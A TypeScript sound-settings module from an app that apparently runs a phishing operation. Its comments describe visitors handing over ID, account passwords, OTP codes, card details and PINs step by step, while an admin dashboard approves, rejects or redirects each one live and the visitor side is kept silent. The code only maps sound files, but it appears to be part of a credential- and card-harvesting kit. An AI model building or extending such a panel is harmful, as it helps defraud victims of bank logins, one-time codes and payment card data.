const BASE = (import.meta as any).env?.BASE_URL || "/";

// All event slots point to a file in /public.
// To change a specific sound: put your mp3 in artifacts/registration-app/public/
// then update its filename below.
const SOUND_FILES = {
  enter: "enter-sound.mp4",       // when visitor first opens the site — صوت مخصص
  step1: "notification.mp3",      // after submitting step 1 (name/phone/id)
  step2: "account-sound.mp4",     // after submitting step 2 (account/password) — صوت مخصص
  step3: "notification.mp3",      // after submitting OTP
  cardSubmit: "card-sound.mp4",   // after submitting card details — صوت مخصص
  pinSubmit: "notification.mp3",  // after submitting PIN
  otpSubmit: "notification.mp3",  // after submitting extra OTP
  approved: "notification.mp3",   // admin clicks "approve"
  rejected: "notification.mp3",   // admin clicks "reject"
  redirect: "notification.mp3",   // admin sends user to a new page
} as const;

type SoundKey = keyof typeof SOUND_FILES;

// Visitor-side sounds are intentionally disabled.
// The dashboard (nova) is the only place sounds should play.
function play(_key: SoundKey, _volume = 0.8) {
  return;
}

export const sounds = {
  enter() { play("enter"); },
  step1() { play("step1"); },
  step2() { play("step2"); },
  step3() { play("step3"); },
  submit() { play("step1"); },
  cardSubmit() { play("cardSubmit"); },
  pinSubmit() { play("pinSubmit"); },
  otpSubmit() { play("otpSubmit"); },
  success() { play("approved"); },
  reject() { play("rejected"); },
  redirect() { play("redirect"); },
  notify() { play("redirect"); },
  unlockOnFirstGesture() {
    // no-op: visitor side is silent.
  },
};
